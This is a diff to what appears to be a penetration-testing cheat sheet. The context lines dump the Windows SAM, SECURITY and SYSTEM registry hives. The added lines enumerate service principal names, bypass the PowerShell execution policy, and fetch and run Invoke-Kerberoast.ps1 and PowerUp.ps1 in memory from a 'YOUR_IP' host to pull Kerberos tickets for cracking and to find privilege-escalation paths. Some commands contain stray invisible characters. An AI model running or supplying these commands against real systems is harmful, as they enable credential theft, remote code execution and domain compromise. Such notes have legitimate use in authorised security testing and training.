@@ -171,3 +171,22 @@ AlwaysInstallElevated
 `reg.exe save hklm\sam c:\temp\sam.save`  
 `reg.exe save hklm\security c:\temp\security.save`  
 `reg.exe save hklm\system c:\temp\system.save`  
+
+---
+
+`setspn -T medin -Q ​ */*` - we can extract all accounts in the SPN
+
+
+`powershell -ep bypass;`  
+`iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Invoke-Kerberoast.ps1')`
+
+Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl
+
+You should get a SPN ticket.
+
+---
+
+ `PowerUp1.ps1` - into memory for enumerating any weakness to abuse for local privilege escalation.
+
+`powershell -ep bypass;`
+`iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1')`
